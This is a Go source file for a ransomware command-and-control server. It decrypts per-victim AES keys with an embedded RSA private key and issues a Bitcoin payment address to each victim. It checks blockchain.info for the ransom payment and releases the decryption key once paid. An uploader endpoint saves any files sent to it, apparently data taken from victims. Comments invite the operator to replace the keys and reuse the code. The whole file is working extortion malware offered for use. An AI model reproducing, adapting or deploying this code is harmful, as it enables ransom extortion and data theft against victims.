package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strconv"

	"github.com/btcsuite/btcd/btcec"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcutil"
	"github.com/tkanos/gonfig"
)

func fromBase10(base10 string) *big.Int {
	i, ok := new(big.Int).SetString(base10, 10)
	if !ok {
		panic("bad number: " + base10)
	}
	return i
}

var Key rsa.PrivateKey

func init() {
	Key = rsa.PrivateKey{
		PublicKey: rsa.PublicKey{
			N: fromBase10("28173238234479268692748171777584780950112726971800472303179518822064257035330343535382062519135554178057392050439512475197418759177681714996439478119637798431181217850091954574573450965244968320132378502502291379125779591047483820406235123169703702675102086669837722293492775826594973909630373982606134840347804878462514286834694538401513937386496705419688029997745683837628079207343818814366116867188449488550233959271590182601502875729623298406808420521843821837320643772450775606353905712230611517533654282258147082226740950169620818579409805061640251994478022087950933425934855126618181491816001603975662267491029"), // modify this
			E: 65537,
		},
		D: fromBase10("13052535705227490353814070520207008315734207074549914407761107923681844398793585619799587473770737621623763596556066302766669603199901580976195002428346773177990376696863481952908642318960785100083607862298809422835894925354757636739468041637574401091354878275726425713678092564855016140777073183604224669384778024042131708308526284245152046009488037321436331452009031651061542882226808591487591611330449679438656795195596759060178579507202392416289631707484972046752658254309289830919745289758766907061371996942117592496873341618461221065819628259643537848480971766449079600381392777973726791017255560502925039453573"), // this too
		Primes: []*big.Int{
			fromBase10("160803121333994197109393236454483826601157235065418104973594680803448050337606271455343999037534246720860929592009049824199942564451893226446637463997113918702301731460176102024266264784288654748363727800821141671230524345484900375041561795874030903441587597634330212912703667181331154286588955401740963032051"), // also this
			fromBase10("175203304517717548961257849098262659002438085654365857455555635248359514793705390774215497938364418743009679986407704640197786599827954540228278686953100138490259703518415344365625777686407611061773887342891903751914332234928888431598063202786326483260607112989813048341608084603529101060754160655066174509079"), // yep, you have to take care of this too
		},
	}
	Key.Precompute()
}

type Network struct {
	name        string
	symbol      string
	xpubkey     byte
	xprivatekey byte
}

var network = map[string]Network{
	"rdd": {name: "reddcoin", symbol: "rdd", xpubkey: 0x3d, xprivatekey: 0xbd},
	"dgb": {name: "digibyte", symbol: "dgb", xpubkey: 0x1e, xprivatekey: 0x80},
	"btc": {name: "bitcoin", symbol: "btc", xpubkey: 0x00, xprivatekey: 0x80},
	"ltc": {name: "litecoin", symbol: "ltc", xpubkey: 0x30, xprivatekey: 0xb0},
}

func (network Network) GetNetworkParams() *chaincfg.Params {
	networkParams := &chaincfg.MainNetParams
	networkParams.PubKeyHashAddrID = network.xpubkey
	networkParams.PrivateKeyID = network.xprivatekey
	return networkParams
}

func (network Network) CreatePrivateKey() (*btcutil.WIF, error) {
	secret, err := btcec.NewPrivateKey(btcec.S256())
	if err != nil {
		return nil, err
	}
	return btcutil.NewWIF(secret, network.GetNetworkParams(), true)
}

func (network Network) ImportWIF(wifStr string) (*btcutil.WIF, error) {
	wif, err := btcutil.DecodeWIF(wifStr)
	if err != nil {
		return nil, err
	}
	if !wif.IsForNet(network.GetNetworkParams()) {
		return nil, errors.New("The WIF string is not valid for the `" + network.name + "` network")
	}
	return wif, nil
}

func (network Network) GetAddress(wif *btcutil.WIF) (*btcutil.AddressPubKey, error) {
	return btcutil.NewAddressPubKey(wif.PrivKey.PubKey().SerializeCompressed(), network.GetNetworkParams())
}

type Victim struct {
	priv_address string
	address      string
	key          []byte
}

type PaymentInfo struct {
	Address string
	Amount  string
}

type Configuration struct {
	Satoshi       int
	Confirmations int
}

var configuration = Configuration{}
var victims = map[string]Victim{}

func handler(w http.ResponseWriter, req *http.Request) {
	if req.URL.Path != "/key/" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	switch req.Method {
	case "POST":
		err := req.ParseForm()
		if err != nil {
			panic(err)
		}

		key, err := hex.DecodeString(req.FormValue("key"))
		if err != nil {
			log.Println("[err] Unable to decode key string from hex.")
			return
		}

		id := req.FormValue("id")
		if id == "" {
			log.Println("[err] Got an empty id.")
			return
		}

		log.Println("Got a new key from", id, "! Decrypting it..")

		aes_key, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, &Key, key, nil)
		if err != nil {
			log.Println("[err] Unable to decrypt key.")
			return
		}
		log.Printf("Key decrypted succesfuly: %x\n", aes_key)

		wif, err := network["btc"].CreatePrivateKey()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Generated private address: %s\n", wif.String())

		address, err := network["btc"].GetAddress(wif)
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Generated public address: %s\n", address.EncodeAddress())

		victims[id] = Victim{
			wif.String(),
			address.EncodeAddress(),
			aes_key,
		}
		json.NewEncoder(w).Encode(PaymentInfo{
			victims[id].address,
			strconv.Itoa(configuration.Satoshi),
		})
		log.Println("Payment information sent!")

		f, err := os.OpenFile("log.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()

		text := "ID: " + id + "\nAes Key: " + hex.EncodeToString(aes_key) + "\nPrivate Key: " + wif.String() + "\n\n"

		if _, err = f.WriteString(text); err != nil {
			log.Fatal(err)
		}
		log.Println("Successfully saved to file.")
	case "GET":
		keys, ok := req.URL.Query()["id"]
		if !ok || len(keys[0]) < 1 {
			log.Println("Url Param 'id' is missing")
			return
		}
		id := keys[0]

		if _, ok := victims[id]; !ok {
			log.Println("Invalid ID:", id)
			return
		}
		payload := url.Values{}
		payload.Set("confirmations", strconv.Itoa(configuration.Confirmations))

		resp, err := http.Get("https://blockchain.info/q/addressbalance/" + victims[id].address + "?" + payload.Encode())
		if err != nil {
			log.Fatal(err)
		}
		responseData, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		amount, err := strconv.Atoi(string(responseData))
		if err != nil {
			log.Fatal(err)
		}

		if amount >= configuration.Satoshi {
			log.Printf("Sending decryption key to: %s", id)
			fmt.Fprintf(w, hex.EncodeToString(victims[id].key))
		}
	default:
		fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
	}
}

func uploader(w http.ResponseWriter, req *http.Request) {
	req.ParseForm()
	file, handler, err := req.FormFile("xxx")

	dst, err := os.Create(handler.Filename)
	defer dst.Close()
	if err != nil {
		log.Fatal(err)
	}

	_, err = io.Copy(dst, file)
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	err := gonfig.GetConf("config.json", &configuration)
	if err != nil {
		log.Fatal(err)
	}
	http.HandleFunc("/key/", handler)
	http.HandleFunc("/uploader/", uploader)

	log.Println("Starting server and listening on port 4444")
	log.Fatal(http.ListenAndServe(":4444", nil))
}
